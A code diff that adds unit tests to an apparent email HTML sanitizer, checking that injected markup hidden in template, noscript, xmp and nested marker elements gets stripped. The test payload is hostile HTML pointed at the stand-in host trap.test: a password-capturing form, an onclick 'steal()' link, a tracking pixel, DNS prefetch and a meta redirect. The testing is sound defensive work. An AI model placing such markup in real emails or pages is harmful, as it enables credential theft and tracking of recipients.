@@ -65,3 +65,37 @@ describe("link sanitization covers every navigable element", () => {
     expect(html).toContain('rel="noopener noreferrer"');
   });
 });
+
+describe("the sanitizer cannot be handed a sender-chosen body", () => {
+  const PAYLOAD = '<link rel="dns-prefetch" href="//id.trap.test"><form action="https://trap.test"><input name="pw"></form>' +
+    '<a href="https://trap.test/?utm_source=x" onclick="steal()">click</a><img src="https://trap.test/open.gif"><meta http-equiv="refresh" content="0;url=https://trap.test">';
+
+  it("ignores a <template data-mail-body> planted in the head", () => {
+    const html = '<html><head><template data-mail-body="">' + PAYLOAD + "</template></head><body><p>decoy</p></body></html>";
+    const cleaned = cleanLinks(html);
+    expect(cleaned).toContain("decoy");
+    for (const leak of ["trap.test", "onclick", "<form", "<input", "dns-prefetch", "http-equiv", "<template"]) {
+      expect(cleaned).not.toContain(leak);
+    }
+  });
+
+  it("ignores the marker attribute on ordinary mail elements, however deeply nested", () => {
+    const html = '<html><head></head><body><div data-mail-body=""><div data-mail-body=""><div data-mail-head="">' + PAYLOAD + "</div></div></div><p>real</p></body></html>";
+    const cleaned = cleanLinks(html);
+    expect(cleaned).toContain("real");
+    expect(cleaned).not.toContain("data-mail-body");
+    expect(cleaned).not.toContain("data-mail-head");
+    for (const leak of ["onclick", "<form", "<input", "dns-prefetch", "http-equiv", "utm_source"]) expect(cleaned).not.toContain(leak);
+    // The link survives, rewritten; the remote image is counted and blocked.
+    expect(cleaned).toContain('rel="noopener noreferrer"');
+    const stripped = stripRemoteImages(cleaned);
+    expect(stripped.blocked).toBe(1);
+    expect(stripped.html).not.toContain("open.gif");
+  });
+
+  it("drops containers the passes cannot see into", () => {
+    const cleaned = cleanLinks("<body><p>kept</p><template>" + PAYLOAD + "</template><noscript>" + PAYLOAD + "</noscript><xmp>" + PAYLOAD + "</xmp></body>");
+    expect(cleaned).toContain("kept");
+    for (const leak of ["trap.test", "<template", "<noscript", "<xmp", "onclick"]) expect(cleaned).not.toContain(leak);
+  });
+});
